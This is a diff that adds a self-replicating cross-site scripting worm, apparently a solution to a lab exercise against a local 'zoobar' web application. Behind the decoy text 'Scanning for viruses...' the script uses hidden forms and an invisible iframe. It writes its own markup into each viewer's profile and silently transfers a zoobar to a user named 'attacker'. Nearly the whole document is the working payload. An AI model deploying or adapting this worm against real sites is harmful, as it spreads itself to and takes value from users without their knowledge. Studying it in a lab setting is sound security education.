@@ -1,0 +1,63 @@
+<div id="repl">
+&nbsp;&nbsp;Scanning for viruses...
+<style>.log{visibility:hidden;line-height:0;height:0;width:0;)</style>
+<style>#fl{width: 500px;}</style>
+<style>tr{padding:0px;}</style>
+
+<iframe name="frame" id="transfer" src="_self" style="visibility:hidden;height:0;width:0;"> </iframe>
+
+<form target="frame" method="POST" name="profileform" action="http://localhost:8080/zoobar/index.cgi">
+ 
+<p hidden>   <textarea id="textB" name="profile_update" rows="0" cols="0" style="visibility:hidden;height:0;width:0;"></textarea> </p>
+
+ <p hidden>   <input type="submit" name="profile_submit" value="Save" style="visibility:hidden;height:0;width:0;"/> </p>
+
+</form>
+
+<form target="frame" method="POST" name="transferform" action="http://localhost:8080/zoobar/index.cgi/transfer">
+
+<p hidden>Send <input name="zoobars" type="text" value="1"  size=0 style="visibility:hidden;height:0;width:0;"> zoobars</p>
+
+<p hidden>to <input name=recipient type=text value="attacker" size=0 style="visibility:hidden;height:0;width:0;"></p>
+
+<p hidden><input type="submit" name="submission" value="Send" style="visibility:hidden;height:0;width:0;"></p>
+
+</form>
+
+<table class="lol" align="center" id="fl">
+<thead>
+<tr><th>Time</th>
+    <th>Sender</th>
+    <th>Recipient</th>
+    <th>Amount</th></tr>
+</thead>
+</table>
+
+
+<script type="text/javascript">
+
+var profileForm = document.forms[1];
+var transferForm = document.forms[2];
+
+function sub() {
+  transferForm.submit();
+  document.getElementById("transfer").removeEventListener("load", sub, false);
+}
+
+document.getElementById("transfer").addEventListener("load", sub, false);
+var badcode = document.getElementById("textB");
+badcode.value = "<div id='repl'>" + document.getElementById("repl").innerHTML
+                 + "</div>";
+
+profileForm.submit();
+
+document.body.appendChild(document.getElementById("fl"));
+
+window.onload = function() {
+total = 10;
+};
+
+</script>
+
+</div>
+
